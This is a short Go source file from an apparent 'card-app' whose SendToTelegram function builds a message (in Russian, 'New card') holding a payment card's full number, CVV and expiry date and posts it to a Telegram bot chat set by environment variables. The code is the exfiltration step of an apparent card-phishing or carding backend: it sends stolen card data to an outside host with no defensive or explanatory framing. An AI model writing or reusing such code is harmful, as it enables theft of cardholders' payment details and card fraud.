package services

import (
	"bytes"
	"card-app/api/models"
	"fmt"
	"net/http"
	"os"
)

func SendToTelegram(card models.CardData) error {
	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")

	message := fmt.Sprintf("💳 Новая карта:\nНомер: %s\nCVV: %s\nСрок: %s", card.CardNumber, card.CVV, card.Expiry)

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	playload := fmt.Sprintf("chat_id=%s&text=%s", chatID, message)

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(playload))
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	return nil

}
